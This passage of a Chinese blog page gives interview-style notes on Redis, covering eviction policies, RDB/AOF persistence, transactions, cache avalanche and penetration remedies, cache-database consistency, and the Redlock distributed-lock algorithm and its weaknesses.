<li><strong>volatile-ttl</strong>：从已设置过期时间的数据集(<code>server.db[i].expires</code>)中挑选将要过期的数据淘汰</li>
<li><strong>volatile-random</strong>：从已设置过期时间的数据集(<code>server.db[i].expires</code>)中任意选择数据淘汰</li>
<li><strong>allkeys-lru</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的<code>key</code>(这个是最常用的)</li>
<li><strong>allkeys-random</strong>：从数据集(<code>server.db[i].dict</code>)中任意选择数据淘汰</li>
<li><strong>no-eviction</strong>:禁止驱逐数据，也就是说当内存不足以容纳新写入的数据时，新写入操作会报错。</li>
</ul>
<p>4.0版本以后增加了以下两种：</p>
<ul>
<li><strong>volatile-lfu</strong>：从已设置过期时间的数据集(<code>server.db[i].expires</code>)中挑选最不经常使用的数据淘汰</li>
<li><strong>allkeys-lfu</strong>：当内存不足以容纳新写入数据时，在键空间中，移除最不经常使用的<code>key</code></li>
</ul>
<h1 id="12-Redis数据持久化（怎么保证Redis挂掉之后再重启数据不会丢失）"><a href="#12-Redis数据持久化（怎么保证Redis挂掉之后再重启数据不会丢失）" class="headerlink" title="12. Redis数据持久化（怎么保证Redis挂掉之后再重启数据不会丢失）"></a>12. Redis数据持久化（怎么保证Redis挂掉之后再重启数据不会丢失）</h1><p>Redis支持两种持久化方案，分别是<strong>RDB（快照）</strong>和<strong>AOF（只追加文件）</strong></p>
<h2 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h2><p>Redis可以通过创建快照来获得存储在内存里面的数据<strong>在某个时间点上的副本</strong>。Redis创建快照之后，可以对快照进行备份，可以将快照复制到其他服务器从而创建具有相同数据的服务器副本（Redis主从结构，主要用来提高Redis性能），还可以将快照留在原地以便重启服务器的时候使用。快照持久化是Redis默认采用的持久化方式。</p>
<h3 id="触发机制"><a href="#触发机制" class="headerlink" title="触发机制"></a>触发机制</h3><h4 id="手动触发"><a href="#手动触发" class="headerlink" title="手动触发"></a>手动触发</h4><ul>
<li><code>save</code>:阻塞当前Redis，直到RDB过程完成，对于内存比较大的实例会造成阻塞，已经被淘汰</li>
<li><code>bgsave</code>:Redis进行执行<code>fork</code>操作创建子进程，RDB持久化过程由子进程完成，完成后自动结束，阻塞只发生在<code>fork</code>阶段，一般时间很短。</li>
</ul>
<h4 id="自动触发"><a href="#自动触发" class="headerlink" title="自动触发"></a>自动触发</h4><ol>
<li><p>使用<code>save</code>相关配置，会自动出发<code>bgsave</code>,在<code>redis.conf</code>配置文件中默认有此下配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">save 900 1           #在900秒(15分钟)之后，如果至少有1个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 300 10          #在300秒(5分钟)之后，如果至少有10个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 60 10000        #在60秒(1分钟)之后，如果至少有10000个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果从节点执行全量复制操作，主节点自动执行<code>bgsave</code>生成RDB文件并发送给从节点</p>
</li>
<li><p>执行<code>debug reload</code>命令时重新加载Redis时，也会自动触发<code>save</code>操作</p>
</li>
<li><p>默认情况下执行<code>shutdown</code>命令，如果没有开启AOF持久化功能则自动执行<code>bgsave</code></p>
</li>
</ol>
<h3 id="流程说明"><a href="#流程说明" class="headerlink" title="流程说明"></a>流程说明</h3><p><code>bgsave</code>执行的流程如下：</p>
<ol>
<li>执行<code>bgsave</code>命令，Redis父进程判断当前是否存在正在执行的子进程，如果<code>RDB/AOF</code>子进程存在则直接返回</li>
<li>父进程执行<code>fork</code>操作创建子进程，<code>fork</code>操作过程父进程会阻塞，通过<code>info stats</code>查看<code>latest_fork_usec</code>选项，获得最近一个<code>fork</code>操作的耗时，单位为微秒</li>
<li>父进程<code>fork</code>完成后，<code>bgsave</code>命令返回<code>Background saving started</code>信息并不再阻塞父进程，可以继续响应其他命令</li>
<li>子进程创建RDB文件，根据父进程内存生成的临时快照文件，完成后对原有文件进行原子替换，执行<code>lastsave</code>可以获取最后一次生成RDB的事件，对应<code>info</code>统计的<code>rdb_last_save_time</code></li>
<li>进程发送信号给父进程表示完成，父进程更新统计信息，存放在<code>info</code>的<code>Persistence</code>下。</li>
</ol>
<h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ul>
<li>RDB是一个紧凑压缩的二进制文件，代表Redis在某个时间点上的一个数据快照，非常适用于备份，全量复制等场景</li>
<li>Redis加载RDB恢复数据远远快于AOF的方式</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><ul>
<li>没法做到实时持久化/秒级持久化</li>
<li>RDB使用特定的二进制格式保存，Redis演变过程中有很多RDB版本，存在老版本无法兼容新版本的问题</li>
<li>如果数据量很大，保存快照的时间会很长。</li>
</ul>
<h2 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h2><p>以独立日志的方式记录每次写命令，将写命令添加到 AOF 文件（Append Only File）的末尾。重启时再重新执行AOF文件中的命令达到恢复数据的目的。AOF的主要作用是解决数据持久化的实时性，因此已成为主流的持久化方案。</p>
<p>默认情况下Redis没有开启AOF方式的持久化，可以通过以下配置开启：</p>
   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<p>开启AOF持久化后每执行一条会更改Redis中的数据的命令，Redis就会将该命令写入硬盘中的AOF文件。AOF文件的保存位置和RDB文件的位置相同，都是通过dir参数设置的，默认的文件名是<code>appendonly.aof</code>。</p>
<h3 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h3><ol>
<li>写入命令(<code>append</code>):所有的写入命令都会追加到<code>aof_buf</code>缓冲区</li>
<li>文件同步(<code>aync</code>):AOF缓冲区根据对应的策略向硬盘做同步操作</li>
<li>文件重写(<code>rewrite</code>):随着AOF文件越来越大，定期对AOF文件进行重写，达到压缩的目的</li>
<li>重启加载(<code>load</code>):当Redis服务器重启时，可以加载AOF文件进行数据恢复</li>
</ol>
<p>在Redis的配置文件中存在三种不同的 AOF 持久化同步策略，它们分别是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">appendfsync always    #每次有数据修改发生时都会写入AOF文件,这样会严重降低Redis的速度</span><br><span class="line">appendfsync everysec  #每秒钟同步一次，显示地将多个写命令同步到硬盘</span><br><span class="line">appendfsync no        #让操作系统决定何时进行同步</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>always</strong>：写入<code>aof_buf</code>后调用系统<code>fsync</code>操作同步到AOF文件，<code>fsync</code>完成后线程返回；每次写入都要进行文件同步，严重降低Redis速度，一般不建议使用</li>
<li><strong>everysec</strong>：命令写入<code>aof_buf</code>后调用系统<code>write</code>操作，完成后线程返回。<code>fsync</code>同步文件操作由专门线程每秒调用一次；建议的策略，<strong>理论上在系统突然宕机的情况下会丢失1秒数据</strong>，<code>fsync</code>完成后会与上次<code>fsync</code>时间做对比，超过两秒后主线程阻塞，直到同步操作完成,<strong>因此最多可能丢失2秒数据，不是1秒</strong></li>
<li><code>no</code>:命令写入<code>aof_buf</code>后调用系统<code>write</code>操作，不对AOF文件做<code>fsync</code>同步，同步硬盘操作由操作系统负责，通常同步周期最长30秒，周期不可控，加大每次同步的数据量，虽然提升了性能，安全性无法保证</li>
</ul>
<h3 id="Redis-4-0-对于持久化机制的优化"><a href="#Redis-4-0-对于持久化机制的优化" class="headerlink" title="Redis 4.0 对于持久化机制的优化"></a>Redis 4.0 对于持久化机制的优化</h3><p>Redis 4.0 开始支持 RDB 和 AOF 的混合持久化（默认关闭，可以通过配置项<code>aof-use-rdb-preamble</code>开启）。</p>
<p>如果把混合持久化打开，AOF 重写的时候就直接把 RDB 的内容写到 AOF 文件开头。这样做的好处是可以结合 RDB 和 AOF 的优点, 快速加载同时避免丢失过多的数据。当然缺点也是有的， AOF 里面的 RDB 部分是压缩格式不再是 AOF 格式，可读性较差。</p>
<h3 id="AOF重写机制"><a href="#AOF重写机制" class="headerlink" title="AOF重写机制"></a>AOF重写机制</h3><p>随着命令不断写入AOF，文件会越来越大，Redis引入重写机制压缩文件体积，AOF文件重写是把Redis进程内的数据转化为写命令同步到新AOF文件的过程<br>重写后AOF文件变小的原理：</p>
<ul>
<li>进程内已经超时的数据不再写入文件</li>
<li>旧的AOF文件含有无效命令，如<code>del key</code>，<code>hdel key2</code>，<code>srem keys</code>，<code>set a1</code>，<code>set a2</code>等，重写时使用进程内的数据直接生成，这样新的AOF文件只保留最终数据的写入命令</li>
<li>多条写的命令合并为一条，如<code>lpush list a</code>，<code>lpush list b</code>转化为<code>lpush list a b</code>，为了防止过多造成客户端缓冲区溢出，以64个元素为界拆分多条</li>
</ul>
<p><strong>重写的优点</strong>：降低文件占用空间，更快的被Redis加载</p>
<h4 id="重写过程的触发："><a href="#重写过程的触发：" class="headerlink" title="重写过程的触发："></a>重写过程的触发：</h4><ul>
<li><strong>手动触发</strong>：使用<code>bgrewriteaof</code>命令</li>
<li><strong>自动触发</strong>：配置文件配置<code>auto-aof-rewrite-min-size</code>,<code>auto-aof-rewrite-percentage</code>,前者表示AOF重写时文件最小体积，默认64MB，后者代表AOF文件空间（<code>aof_current_size</code>）和上一次重写后AOF文件空间（<code>aof_base_size</code>）的比值</li>
</ul>
<h4 id="重写流程"><a href="#重写流程" class="headerlink" title="重写流程"></a>重写流程</h4><ol>
<li>执行AOF重写请求，如果当前进程正在执行AOF重写，请求不执行；如果当前进程正在执行<code>bgsave</code>操作，重写命令延迟到<code>bgsave</code>完成之后再执行</li>
<li>父进程执行fork创建子进程，开销等同于<code>bgsave</code></li>
<li>(1).主进程<code>fork</code>操作完成后，继续响应其他命令，所有修改命令依然写入AOF缓冲区并根据<code>appendfsync</code>策略同步到硬盘，保证原有AOF机制正确性<br>(2).由于<code>fork</code>操作运用写时复制技术，子进程只能共享<code>fork</code>操作时的内部数据。由于父进程依然响应命令，Redis使用<strong>AOF重写缓冲区</strong>保证这部分新数据，防止新的AOF文件生成期间丢失这部分数据</li>
<li>子进程根据内存快照，按照命令合并规则写入到新的AOF文件，每次批量写入硬盘数据量由配置<code>aof-rewrite-incremental-fsync</code>控制，默认32MB，防止单次刷盘数据过多造成硬盘阻塞</li>
<li>(1). 新AOF文件写入完成后，子进程发送信号给父进程，父进程更新统计信息<br>(2). 父进程把AOF重写缓冲区的数据写入到新的AOF文件<br>(3). 使用新的AOF文件替换老文件，重写完成</li>
</ol>
<h1 id="13-Redis事务"><a href="#13-Redis事务" class="headerlink" title="13. Redis事务"></a>13. Redis事务</h1><p>Redis提供了简单的事务功能，将一组需要执行的命令放到<code>multi</code>和<code>exec</code>之间，<code>multi</code>代表事务开始，<code>exec</code>代表事务结束，只有执行了<code>exec</code>后中间的命令才会被执行</p>
<p>如果要停止事务的执行，可以使用<code>discard</code>命令代替<code>exec</code></p>
<p>事务中出现错误的情况：</p>
<ul>
<li><strong>命令错误</strong>：例如语法错误，会导致整个事务无法执行</li>
<li><strong>运行时错误</strong>：例如错将<code>sadd</code>写成<code>zadd</code>，这时候执行<code>exec</code>时<strong>正确的命令会被执行，Redis不支持回滚功能</strong></li>
</ul>
<p>在事务之前如果需要确保事务中的<code>key</code>没有被其他客户端修改才能执行，否则不执行（乐观锁），可以通过在<code>multi</code>之前先执行<code>watch</code>命令来实现</p>
<p><strong>Redis事务提供了一种将多个命令请求打包的功能。然后，再按顺序执行打包的所有命令，并且不会被中途打断。</strong></p>
<p>在传统的关系式数据库中，常常用 ACID 性质来检验事务功能的可靠性和安全性。在 Redis 中，事务总是具有原子性（Atomicity）、一致性（Consistency）和隔离性（Isolation），并且当 Redis 运行在某种特定的持久化模式下时，事务也具有持久性（Durability）。</p>
<h1 id="14-缓存雪崩问题解决方案"><a href="#14-缓存雪崩问题解决方案" class="headerlink" title="14. 缓存雪崩问题解决方案"></a>14. 缓存雪崩问题解决方案</h1><p>缓存雪崩指的是缓存同一时间大面积的失效，所以后面的请求都会落到数据库上，造成数据库短时间内承受大量的请求而崩掉。</p>
<p>解决方案：</p>
<ul>
<li>事前：尽量保证整个Redis集群的高可用性，发现机器宕机尽快补上，选择合适的内存淘汰策略</li>
<li>事中：<strong>本地ehcache缓存+hystrix限流&amp;降级</strong>，避免MySQL崩掉</li>
<li>事后：利用redis持久化机制保存的数据尽快恢复缓存</li>
</ul>
<p><img src="http://qiniu.xiaoming.net.cn/%E7%BC%93%E5%AD%98%E9%9B%AA%E5%B4%A9%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88.jpeg" alt="缓存雪崩解决方案"></p>
<p><strong>针对 Redis 服务不可用的情况：</strong></p>
<ol>
<li>采用 Redis 集群，避免单机出现问题整个缓存服务都没办法使用。</li>
<li>限流，避免同时处理大量的请求。</li>
</ol>
<p><strong>针对热点缓存失效的情况：</strong></p>
<ol>
<li>设置不同的失效时间比如随机设置缓存的失效时间。</li>
<li>缓存永不失效。</li>
</ol>
<h1 id="15-缓存穿透问题解决方案"><a href="#15-缓存穿透问题解决方案" class="headerlink" title="15. 缓存穿透问题解决方案"></a>15. 缓存穿透问题解决方案</h1><p>缓存穿透说简单点就是大量请求的 key 根本不存在于缓存中，导致请求直接到了数据库上，根本没有经过缓存这一层。举个例子：某个黑客故意制造我们缓存中不存在的 key 发起大量请求，导致大量请求落到数据库。</p>
<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>最基本的就是首先做好参数校验，一些不合法的参数请求直接抛出异常信息返回给客户端。比如查询的数据库 id 不能小于 0、传入的邮箱格式不对的时候直接返回错误消息给客户端等等。</p>
<h3 id="缓存无效-key"><a href="#缓存无效-key" class="headerlink" title="缓存无效 key"></a>缓存无效 key</h3><p>如果缓存和数据库都查不到某个 key 的数据就写一个到 Redis 中去并设置过期时间，具体命令如下： <code>SET key value EX 10086</code> 。这种方式可以解决请求的 key 变化不频繁的情况，如果黑客恶意攻击，每次构建不同的请求 key，会导致 Redis 中缓存大量无效的 key 。很明显，这种方案并不能从根本上解决此问题。如果非要用这种方式来解决穿透问题的话，尽量将无效的 key 的过期时间设置短一点比如 1 分钟。</p>
<h3 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h3><p>将所有可能存在的数据哈希到一个足够大的bitmap中，一个一定不存在的数据会被这个bitmap拦截掉，从而避免了对底层存储系统的查询压力。</p>
<p>具体是这样做的：把所有可能存在的请求的值都存放在布隆过滤器中，当用户请求过来，先判断用户发来的请求的值是否存在于布隆过滤器中。不存在的话，直接返回请求参数错误信息给客户端，存在的话才会走下面的流程。</p>
<p>流程如下：</p>
<p><img src="http://qiniu.xiaoming.net.cn/%E5%8A%A0%E5%85%A5%E5%B8%83%E9%9A%86%E8%BF%87%E6%BB%A4%E5%99%A8%E5%90%8E%E7%9A%84%E7%BC%93%E5%AD%98%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B.png" alt="加入布隆过滤器后的缓存处理流程"></p>
<p>但是，需要注意的是布隆过滤器可能会存在误判的情况。总结来说就是： <strong>布隆过滤器说某个元素存在，小概率会误判。布隆过滤器说某个元素不在，那么这个元素一定不在。</strong>(具体原因看<strong>面试复习——数据结构</strong>第13题)</p>
<h3 id="缓存空结果"><a href="#缓存空结果" class="headerlink" title="缓存空结果"></a>缓存空结果</h3><p>另外也有一个更为简单粗暴的方法，如果一个查询返回的数据为空（不管是数据不存在，还是系统故障），仍然把这个空结果进行缓存，但它的过期时间会很短，最长不超过五分钟。</p>
<h1 id="16-如何解决Redis的并发竞争key问题"><a href="#16-如何解决Redis的并发竞争key问题" class="headerlink" title="16. 如何解决Redis的并发竞争key问题"></a>16. 如何解决Redis的并发竞争key问题</h1><p>所谓Redis的并发竞争Key的问题也就是多个系统同时对一个Key进行操作，但是最后执行的顺序和期望的顺序不同，这样也就导致了结果的不同。</p>
<p>解决方案：可以使用分布式锁（<code>Zookeeper</code>和 redis 都可以实现分布式锁）。（如果不存在Redis的并发竞争Key问题，不要使用分布式锁，这样会影响性能）</p>
<p>基于zookeeper临时有序节点可以实现的分布式锁。大致思想为：每个客户端对某个方法加锁时，在<code>zookeeper</code>上的与该方法对应的指定节点的目录下，生成一个唯一的瞬时有序节点。 判断是否获取锁的方式很简单，只需要判断有序节点中序号最小的一个。 当释放锁的时候，只需将这个瞬时节点删除即可。同时，其可以避免服务宕机导致的锁无法释放，而产生的死锁问题。完成业务流程后，删除对应的子节点释放锁。</p>
<p>在实践中，当然是以可靠性为主,所以首推Zookeeper。</p>
<h1 id="17-如何保证缓存与数据库双写时的数据一致性？"><a href="#17-如何保证缓存与数据库双写时的数据一致性？" class="headerlink" title="17. 如何保证缓存与数据库双写时的数据一致性？"></a>17. 如何保证缓存与数据库双写时的数据一致性？</h1><p>只要用缓存，就可能会涉及到缓存与数据库双存储，双写，只要是双写，就一定会有数据一致性问题，如何解决呢？</p>
<p>一般来说，如果系统不是严格要求缓存+数据库必须一致性的话，缓存可以稍微跟数据库偶尔有不一致的情况。</p>
<p>另外，可以将读请求和写请求串行化，串到一个内存队列里去，这样就可以保证一定不会出现不一致的情况，但是串行化之后，就会导致系统的吞吐量大幅度降低，需要用比正常情况下多几倍的机器去支撑线上的一个请求。</p>
<p>解决这个问题的最经典的模式，就是 Cache Aside Pattern 数据库读写模式（<strong>旁路缓存模式</strong>）。</p>
<ol>
<li>读的时候先读缓存，如果缓存不存在的话就读数据库，取出数据库后更新缓存；如果存在的话直接读取缓存的信息。</li>
<li>写的时候，先更新数据库，再删除缓存。</li>
</ol>
<h2 id="为什么是删除缓存而不是更新缓存？"><a href="#为什么是删除缓存而不是更新缓存？" class="headerlink" title="为什么是删除缓存而不是更新缓存？"></a>为什么是删除缓存而不是更新缓存？</h2><p>很多时候复杂的缓存场景，缓存不是仅仅从数据库中取出来的值。可能是关联多张表的数据并通过计算才是缓存需要的值。并且，更新缓存的代价有时候很高。<strong>对于需要频繁写操作，而读操作很少的时候，每次进行数据库的修改，缓存也要随之更新，会造成系统吞吐的下降，但此时缓存并不会被频繁访问到，用到的缓存才去算缓存</strong>。</p>
<p>删除缓存而不是更新缓存，是一种懒加载的思想，不是每次都重复更新缓存，只有用到的时候才去更新缓存，同时即使有大量的读请求，实际也就更新了一次，后面的请求不会重复读。</p>
<h2 id="Cache-Aside-Pattern存在的问题"><a href="#Cache-Aside-Pattern存在的问题" class="headerlink" title="Cache Aside Pattern存在的问题"></a>Cache Aside Pattern存在的问题</h2><p>问题：先更新数据库，再删除缓存，如果删除缓存失败了，导致数据库中是新数据，缓存中是旧数据，就出现数据不一致的问题。</p>
<p><strong>解决思路</strong>：先删除缓存，再更新数据库。</p>
<ul>
<li>缓存删除失败：如果缓存删除失败，那么就不会继续执行，数据库信息没有被修改，保持了数据的一致性；</li>
<li>缓存删除成功，数据库更新失败：此时数据库里的是旧数据，缓存是空的，查询时发现缓存不存在，就查询数据库并更新缓存，数据保持一致。</li>
</ul>
<p>问题：上面的方案存在不足，如果删除完缓存更新数据库时，如果一个请求过来查询数据，缓存不存在，就查询数据库的旧数据，更新旧数据到缓存中。随后数据更新完成，修改了数据库的数据，此时缓存和数据库的数据就会出现不一致了。高并发下会出现这种数据库 + 缓存不一致的情况。 如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。</p>
<p><strong>解决方案</strong>：采用双删除策略。写请求先删除缓存，再去更新数据库，等待一段时间后异步删除缓存。这样可以保证在读取错误数据时能及时被修正过来。</p>
<p>还有一种策略，就是：写请求先修改缓存为指定值，然后再去更新数据库，再更新缓存。读请求过来后，会先读缓存，判断是指定值后就进入循环读取状态，等到写请求更新缓存。如果循环超时就去数据库读取数据，更新缓存。</p>
<p>这种方案保证了读写的一致性，但由于读请求等待写请求的完成，会降低系统的吞吐量。</p>
<h1 id="18-Redlock分布式锁"><a href="#18-Redlock分布式锁" class="headerlink" title="18. Redlock分布式锁"></a>18. Redlock分布式锁</h1><p>Redis官方提出一种基于Redis实现的分布式锁的方式叫<code>Redlock</code>,这种方法比原先单节点的方法更安全。它可以保证以下特性：</p>
<ul>
<li>安全特性：互斥访问，即永远只有一个<code>client</code>能拿到锁</li>
<li>避免死锁：最终<code>client</code>都可能拿到锁，不会出现死锁的情况，即使原本锁住某资源的<code>client</code>crash了或者出现了网络分区</li>
<li>容错性：只要大部分Redis节点存活就可以正常提供服务</li>
</ul>
<h2 id="怎么在单点上实现分布式锁"><a href="#怎么在单点上实现分布式锁" class="headerlink" title="怎么在单点上实现分布式锁"></a>怎么在单点上实现分布式锁</h2><p>主要通过以下命令:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET resource_name my_random_value NX PX 30000</span><br></pre></td></tr></table></figure>

<p>该命令仅当key不存在（NX保证）时，<code>set</code>值，并且设置过期时间为<code>3000ms</code>(PX保证)，值<code>my_random_value</code>必须是所有<code>client</code>和所有锁请求发生期间唯一的，释放锁的逻辑是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if redis.call(&quot;get&quot;,KEYS[1]) &#x3D;&#x3D; ARGV[1] then</span><br><span class="line">    return redis.call(&quot;del&quot;,KEYS[1])</span><br><span class="line">else</span><br><span class="line">    return 0</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>上述实现避免了释放另一个<code>client</code>创建的锁，如果只有<code>del</code>命令的话，如果<code>client1</code>拿到<code>lock1</code>之后因为某些操作阻塞了很长时间，此时Redis端<code>lock1</code>已经过期了并且已经被重新分配给了<code>client2</code>,那么<code>client1</code>此时再去释放这把锁就会造成<code>client2</code>原本获取到的锁被<code>client1</code>无故释放了，但现在为每个<code>client</code>分配一个<code>unique</code>的<code>string</code>值可以避免这个问题。至于如何去生成这个<code>unique string</code>，方法很多随意选择一种就行了。</p>
<h2 id="Redlock算法"><a href="#Redlock算法" class="headerlink" title="Redlock算法"></a>Redlock算法</h2><p>假设有5个<code>master</code>节点，分布在不同的机房，为了获得锁，<code>client</code>会进行如下操作：</p>
<ol>
<li>得到当前的事件，微秒单位</li>
<li>尝试顺序的在5个实例上申请锁，当然需要使用相同的<code>key</code>和<code>random value</code>,这里一个<code>client</code>需要合理设置与<code>master</code>节点沟通的<code>timeout</code>大小，避免长时间和一个<code>fail</code>的节点浪费时间</li>
<li>当<code>client</code>在大于等于 3 个<code>master</code>上成功申请到锁的时候，且它会计算申请锁消耗了多少时间，这部分消耗的时间采用获得锁的当下时间减去第一步获得的时间戳得到，如果锁的持续时长（lock validity time）比流逝的时间多的话，那么锁就真正获取到了。</li>
<li>如果锁申请到了，那么锁真正的<code>lock validity time</code>应该是<code>origin（lock validity time） - 申请锁期间流逝的时间</code></li>
<li>如果<code>client</code>申请锁失败了，那么它就会在少部分申请成功锁的<code>master</code>节点上执行释放锁的操作，重置状态。</li>
</ol>
<blockquote>
<p>这个算法是基于一个假设：虽然不存在可以跨进程的同步时钟，但是不同进程时间都是以差不多相同的速度前进，这个假设不一定完全准确，但是和自动释放锁的时间长度相比不同进程时间前进速度差异基本是可以忽略不计的。</p>
</blockquote>
<h2 id="失败重试"><a href="#失败重试" class="headerlink" title="失败重试"></a>失败重试</h2><p>如果一个<code>client</code>申请锁失败了，那么它需要稍等一会再重试避免多个<code>client</code>同时申请锁的情况，最好的情况是一个<code>client</code>需要几乎同时向5个<code>master</code>发起申请锁申请。另外就是如果<code>client</code>申请锁失败了它需要尽快在它曾经申请到锁的<code>master</code>上执行<code>unlock</code>操作，便于其它<code>client</code>获取这把锁，避免这些锁过期造成的时间浪费，当然如果这时候网络分区使得<code>client</code>无法联系上这些<code>master</code>,那么这种浪费就是不得不付出的代价了。</p>
<h2 id="放锁"><a href="#放锁" class="headerlink" title="放锁"></a>放锁</h2><p>放锁操作很简单，就是依次释放所有节点上的锁就行了</p>
<h2 id="性能、崩溃恢复和fsync"><a href="#性能、崩溃恢复和fsync" class="headerlink" title="性能、崩溃恢复和fsync"></a>性能、崩溃恢复和fsync</h2><p>如果节点没有持久化机制，<code>client</code>从 5 个<code>master</code>中的 3 个处获得了锁，然后其中一个重启了，这时注意整个环境中又出现了 3 个<code>master</code>可供另一个<code>client</code>申请同一把锁！ 违反了互斥性。如果开启了 AOF 持久化那么情况会稍微好转一些，因为 Redis 的过期机制是语义层面实现的，所以在<code>server</code>挂了的时候时间依旧在流逝，重启之后锁状态不会受到污染。但是考虑断电之后呢，AOF部分命令没来得及刷回磁盘直接丢失了，除非配置刷回策略为<code>fsnyc = always</code>，但这会损伤性能。解决这个问题的方法是，当一个节点重启之后，规定在<code>max TTL</code>期间它是不可用的，这样它就不会干扰原本已经申请到的锁，等到它<code>crash</code>前的那部分锁都过期了，环境不存在历史锁了，那么再把这个节点加进来正常工作。</p>
<h2 id="RedLock缺陷"><a href="#RedLock缺陷" class="headerlink" title="RedLock缺陷"></a>RedLock缺陷</h2><p>需要用到锁的主要有以下两种场景考虑：</p>
<ul>
<li><strong>性能</strong>：拥有这把锁使得你不会重复劳动（例如一个job做了两次），如果这把锁fail了，两个节点同时做了这个job，那么这个job增加了你的成本</li>
<li><strong>正确性</strong>：拥有锁可以防止并发操作污染了你的系统或者数据，如果这把锁fail了，两个节点同时操作了一份数据，结果可能是数据不一致、数据丢失、file冲突等，会导致严重的后果</li>
</ul>
<h3 id="RedLock算法不可靠的场景"><a href="#RedLock算法不可靠的场景" class="headerlink" title="RedLock算法不可靠的场景"></a>RedLock算法不可靠的场景</h3><p>在分布式环境下，锁比<code>mutex</code>这类复杂，因为涉及到不同节点、网络通信并且他们随时可能无征兆的fail。假设现在有一个场景：一个client要修改一个文件，它先申请得到锁，然后修改文件写回，放锁。另一个client再申请锁。代码流程如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function writeData(filename,data)&#123;</span><br><span class="line">    var lock &#x3D; lockService.acquireLock(filename);</span><br><span class="line">    if(!lock) &#123;</span><br><span class="line">        throw &#39;Failed to acquire lock!&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    try &#123;</span><br><span class="line">        var file &#x3D; storage.readFile(filename);</span><br><span class="line">        var updated &#x3D; updateContents(file,data);</span><br><span class="line">        sotrage.writeFile(filename,updated);</span><br><span class="line">    &#125;finally &#123;</span><br><span class="line">        lock.release();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码在以下流程中还是有可能出现bug：</p>
<p><img src="https://camo.githubusercontent.com/b1fd3e057266f0ca21f69e2a26f420f9564c5cdb/68747470733a2f2f6d617274696e2e6b6c6570706d616e6e2e636f6d2f323031362f30322f756e736166652d6c6f636b2e706e67" alt="RedLock锁流程"></p>
<p>在上述图中，得到锁的client1在持有锁的期间pause（暂停）了一段时间，例如GC停顿。锁有过期时间（一般叫租约，为了防止某个 client 崩溃之后一直占有锁），但是如果 GC 停顿太长超过了锁租约时间，此时锁已经被另一个 client2 所得到，原先的 client1 还没有感知到锁过期，这时候client再进行写时就会发生错误。即使在client1写回之前检查一下锁是否过期也无法解决这个问题，因为GC可能在任何时候发生，即使在最后的检查和写操作期间。</p>
<p>除了GC停顿，还有很多原因可能导致进程pause。例如进程可能读取尚未进入内存的数据，所以它得到一个 page fault （错误页面）并且等待 page 被加载进缓存；还有可能你依赖于网络服务；或者其他进程占用 CPU；或者其他意外发生 SIGSTOP 等。</p>
<h3 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h3><h4 id="使用Fencing（栏栅）使锁变安全"><a href="#使用Fencing（栏栅）使锁变安全" class="headerlink" title="使用Fencing（栏栅）使锁变安全"></a>使用Fencing（栏栅）使锁变安全</h4><p>在每次写操作时加入一个<code>fencing token</code>,这个场景下，<code>fencing token</code>可以是一个递增的数字（lock service可以做到），每次有client申请锁就递增一次：</p>
<p><img src="https://camo.githubusercontent.com/4ca3c6919e560b60b130c4f856d2736314713e62/68747470733a2f2f6d617274696e2e6b6c6570706d616e6e2e636f6d2f323031362f30322f66656e63696e672d746f6b656e732e706e67" alt="使用Fencing解决锁不安全问题"></p>
<p>client1 申请锁同时拿到<code>token33</code>，然后它进入长时间的停顿锁也过期了。client2 得到锁和<code>token34</code>写入数据，紧接着 client1 活过来之后尝试写入数据，自身<code>token33</code>比<code>34</code>小因此写入操作被拒绝。注意这需要存储层来检查<code>token</code>，但这并不难实现。如果使用<code>Zookeeper</code>作为<code>lock service</code>的话那么可以使用<code>zxid</code>作为递增数字。 但是<strong>对于 Redlock ，没什么生成<code>fencing token</code>的方式，并且怎么修改 Redlock 算法使其能产生<code>fencing toke</code>并不那么显而易见。因为产生<code>token</code>需要单调递增，除非在单节点<code>Redis</code>上完成但是这又没有高可靠性</strong>，需要引进一致性协议来让 Redlock 产生可靠的<code>fencing token</code>。</p>
<h4 id="使用时间来解决一致性"><a href="#使用时间来解决一致性" class="headerlink" title="使用时间来解决一致性"></a>使用时间来解决一致性</h4><p>学术界有个说法，算法对时间不做假设：因为进程可能pause一段时间、数据包可能因为网络延迟延后到达、时钟可能根本就是错的。而可靠的算法依旧要在上述假设下做正确的事情。</p>
<p>同样Redlock算法也是假设所有 Redis 节点都能对同一个 Key 在其过期前持有差不多的时间、跟过期时间相比网络延迟很小、跟过期时间相比进程 pause 很短。</p>
<h4 id="Redlock不可靠的例子"><a href="#Redlock不可靠的例子" class="headerlink" title="Redlock不可靠的例子"></a>Redlock不可靠的例子</h4><p>由于<strong>时间问题</strong>：</p>
<ol>
